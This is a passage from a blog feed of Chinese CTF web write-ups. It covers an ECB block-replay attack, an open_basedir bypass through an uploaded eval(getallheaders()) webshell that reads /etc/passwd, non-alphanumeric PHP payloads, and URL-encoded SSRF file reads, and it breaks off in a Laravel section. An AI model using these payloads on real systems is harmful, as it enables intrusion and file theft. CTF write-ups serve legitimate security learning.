class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;a36f22c1-c351-4421-a3bf-ec8ed90da70c&quot;,&quot;user&quot;:&quot;2ec978ed-fc05-4aad-9cd6-da41b1afcb9b&quot;,&quot;coin&quot;:3&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>我们对如上明密文对进行攻击，想将用户1的lottery替换为用户2的，如此即可扣用户2的lottery，来增加用户1的coin：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">32</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;a3382695-2b68-4666-8fda-b775edfe52fd&quot;,&quot;user&quot;:&quot;2e2dd369-e9a8-4e62-9dac-76fe75353f89&quot;,&quot;coin&quot;:9&#125;&#125;</span><br><span class="line"></span><br><span class="line">64</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;a36f22c1-c351-4421-8fda-b775edfe52fd&quot;,&quot;user&quot;:&quot;2e2dd369-e9a8-4e62-9dac-76fe75353f89&quot;,&quot;coin&quot;:9&#125;&#125;</span><br><span class="line"></span><br><span class="line">96</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;a36f22c1-c351-4421-a3bf-ec8ed90da7fd&quot;,&quot;user&quot;:&quot;2e2dd369-e9a8-4e62-9dac-76fe75353f89&quot;,&quot;coin&quot;:9&#125;&#125;</span><br><span class="line"></span><br><span class="line">128</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;a36f22c1-c351-4421-a3bf-ec8ed90da70c&quot;,&quot;user&quot;:&quot;2e2dd369-e9a8-4e62-9dac-76fe75353f89&quot;,&quot;coin&quot;:9&#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-28-18-01-48.png" alt=""><br>我尝试对用户1的密文分组进行逐一替换，当替换128位后，发现我们可以将用户1的lottery替换成用户2的，但是此时user前2位值也会变为用户2的，那么这里即考虑，注册多个user前2位相同的用户，再用ECB重放攻击进行刷钱：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;49382695-2b68-4666-8fda-b775edfe52fd&quot;,&quot;user&quot;:&quot;2e2dd369-e9a8-4e62-9dac-76fe75353f89&quot;,&quot;coin&quot;:9&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;a36f22c1-c351-4421-a3bf-ec8ed90da70c&quot;,&quot;user&quot;:&quot;2ec978ed-fc05-4aad-9cd6-da41b1afcb9b&quot;,&quot;coin&quot;:3&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>对于如上info的2个用户，我们就可以将用户1的lottery替换为用户2的，因为其user开头2位都是2e：<br><img src="/images/2020-06-28-18-00-17.png" alt="">移花接木后，我们可以得到如下info的密文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;a36f22c1-c351-4421-a3bf-ec8ed90da70c&quot;,&quot;user&quot;:&quot;2e2dd369-e9a8-4e62-9dac-76fe75353f89&quot;,&quot;coin&quot;:9&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>尝试进行charge：<br><img src="/images/2020-06-28-17-59-12.png" alt=""><br>发现可以成功charge，重复多次操作，即可增加我们的coin，获取flag：<br><img src="/images/2020-06-28-18-29-28.png" alt=""></p><h2 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a>Cloud Computing</h2><p>这是Misc里的一道题，本不应该出现在此，但因为其考察点为web open_basedir bypass（其实是非预期了），所以在这里记录了一下，题目同样是给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">    $data = $_GET[<span class="string">"data"</span>] ?? <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf($data)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'waf sucks...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="string">"$dir"</span> . <span class="string">"index.php"</span>, $data);</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'shell'</span>:</span><br><span class="line">    initShellEnv($dir);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">"index.php"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>同时发现题目运行在php7.4.7：<br><img src="/images/2020-06-27-16-38-24.png" alt=""><br>测试过程中发现，我们input的data被过滤了引号，下划线等字符，这让我们执行代码非常不便，同时phpinfo都被过滤了，于是这里考虑使用无参数函数RCE的方式，我们利用eval(end(getallheaders()))的方式进行偷梁换柱，在http header注入我们想执行的phpcode，以此达成bypass waf的目的：<br><img src="/images/2020-06-28-21-18-05.png" alt=""><br>但是依旧无法使用phpinfo等函数，怀疑是被disable_function给禁了，这里开启报错，来一探究竟：<br><img src="/images/2020-06-28-21-18-59.png" alt=""><br>同时发现我们受限于open basedir：<br><img src="/images/2020-06-28-21-19-38.png" alt=""><br>但是发现sandbox可以任意创建文件，于是想到可以使用chdir来bypass openbasedir：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://pwnable.org:47780/?action=upload&amp;data=%s'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">"&lt;?=eval(end(getallheaders()));?&gt;"</span></span><br><span class="line"></span><br><span class="line">php_code = <span class="string">r'''error_reporting(3);chdir('/var/www/html/sandbox/53c1fd9bc66d9601edeaa6ec8c52aa38fb6721be/A');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/etc/passwd');'''</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">'a'</span>:php_code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dir_url = <span class="string">'http://pwnable.org:47780/?action=pwd'</span></span><br><span class="line"></span><br><span class="line">first_url = url % data</span><br><span class="line">second_url = <span class="string">"http://pwnable.org:47780/?action=shell"</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url=dir_url)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"></span><br><span class="line">r = requests.get(url=first_url,headers=headers)</span><br><span class="line"><span class="keyword">print</span> urllib.quote(data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"></span><br><span class="line">r = requests.get(url=second_url,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>发现可以成功bypass oepn_basedir，读取/etc/passwd：<br><img src="/images/2020-06-27-18-24-05.png" alt=""><br>那么读取根目录的flag文件即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;TCTF是国内高质量比赛之一，这次周末参加了一下，以下是Web题解。&lt;/p&gt;
&lt;h2 id=&quot;Wechat-Generator&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2020 第五空间 Web Writeup</title>
    <link href="http://skysec.top/2020/06/24/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-Web-Writeup/"/>
    <id>http://skysec.top/2020/06/24/2020-第五空间-Web-Writeup/</id>
    <published>2020-06-24T02:01:56.000Z</published>
    <updated>2020-06-25T01:27:54.002Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近日参加了第五空间的比赛，以下是比赛中Web的所有题解。</p><h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate-php"></a>hate-php</h2><p>拿到题目后，题目给出了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>不难发现题目中有2项过滤，一个是正则匹配：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code))</span><br></pre></td></tr></table></figure></p><p>另一个是黑名单函数禁用：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line"><span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里考虑使用无字母webshell进行bypass，详细文章参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</span><br></pre></td></tr></table></figure></p><p>我们进行如下构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump   ~%89%9E%8D%A0%9B%8A%92%8F</span><br><span class="line">scandir       ~%8C%9C%9E%91%9B%96%8D</span><br></pre></td></tr></table></figure></p><p>然后将其组合在一起，并列举当前目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.36.74.163/?code=(~%89%9E%8D%A0%9B%8A%92%8F)((~%8C%9C%9E%91%9B%96%8D)(~%D1))</span><br></pre></td></tr></table></figure></p><p>得到回显如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(8) &quot;flag.php&quot; [3]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>读取flag.php：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readfile    %8D%9A%9E%9B%99%96%93%9A</span><br><span class="line">flag.php   %99%93%9E%98%D1%8F%97%8F</span><br></pre></td></tr></table></figure></p><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.36.74.163/?code=(~%8D%9A%9E%9B%99%96%93%9A)(~%99%93%9E%98%D1%8F%97%8F)</span><br></pre></td></tr></table></figure></p><p>随即得到flag：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">'flag&#123;ecee9b5f24f8aede87cdda995fed079c&#125;'</span>;</span><br></pre></td></tr></table></figure></p><h2 id="do-you-know"><a href="#do-you-know" class="headerlink" title="do you know"></a>do you know</h2><p>题目上来也给予了源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#本题无法访问外网</span></span><br><span class="line"><span class="comment">#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了</span></span><br><span class="line"><span class="comment">#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好</span></span><br><span class="line"><span class="comment">#there is xxe.php</span></span><br><span class="line">$poc=$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/log|flag|hist|dict|etc|file|write/i"</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$ids=explode(<span class="string">'&amp;'</span>,$poc);</span><br><span class="line">$a_key=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">0</span>];</span><br><span class="line">$b_key=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">$a_value=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">1</span>];</span><br><span class="line">$b_value=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$a_key||!$b_key||!$a_value||!$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'我什么都没有~'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a_key==$b_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"trick"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a_value!==$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(count($_GET)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'be it so'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">        $url=$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">        <span class="comment">#add_debug_log($param, 'post_data');</span></span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置header</span></span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span>) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    var_dump($res);</span><br></pre></td></tr></table></figure></p><p>我们发现index.php中有一个curl的功能，同时提示我们有xxe.php的页面：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#这题和命令执行无关，请勿尝试</span></span><br><span class="line"><span class="comment">#there is main.php and hints.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$data = preg_replace(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|system|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,$data);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($dom);</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>同时看到题目提示main.php和hints.php，那么考虑应该使用XXE进行读取，但有Ip限制：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因此考虑使用index.php的curl功能进行bypass，进行SSRF+XXE。<br>但是遗憾的是，在分析题目waf，尝试bypass时，发现题目的一些弊端：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$poc=$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/log|flag|hist|dict|etc|file|write/i"</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>我们看到index.php的限制，发现其没有考虑urldecode的问题，那么导致我们可以使用url编码进行绕过，从而可以使用file或者flag等关键词：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line"></span><br><span class="line">%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64</span><br></pre></td></tr></table></figure></p><p>因此，只要可以进行curl请求，那么我们就可以直接读取hints.php或者main.php，题目出现较为严重的非预期。<br>那么如何使用curl的功能呢？我们同样可以使用url编码进行绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?%75rl=skysec&amp;url=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</span><br></pre></td></tr></table></figure></p><p>至此我们就可以读取任意文件内容了，首先读取file:///etc/passwd，进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?%75rl=skysec&amp;url=%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-25-09-00-30.png" alt=""><br>发现页面成功回显，那么尝试读取hints.php，这里使用常见web目录/var/www/html：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?%75rl=skysec&amp;url=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%68%69%6e%74%73%2e%70%68%70</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-25-09-02-04.png" alt=""><br>再读main.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?%75rl=skysec&amp;url=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%6d%61%69%6e%2e%70%68%70</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-25-09-02-39.png" alt=""><br>发现存在flag.php，于是读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?%75rl=skysec&amp;url=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-25-09-03-12.png" alt=""><br>随即拿到flag。</p><h2 id="laravel"><a href="#laravel" class="headerlink" title="laravel"></a>laravel</h2><p>又是一道laravel pop chain的寻找题，这题都出烂了啊= =，感觉laraval已经被CTF日穿了，233333.<br>首先看到laraval版本号：<br><img src="/images/2020-06-25-09-04-52.png" alt=""><br>然而我们最常用的PendingCommand类的<strong>destruct方法已经被禁止了。于是搜寻新chain，这里同样还是从</strong>destruct方法切入，全局搜索<strong>destruct方法，发现如下路径中，存在ImportConfigurator类，其拥有</strong>destruct方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 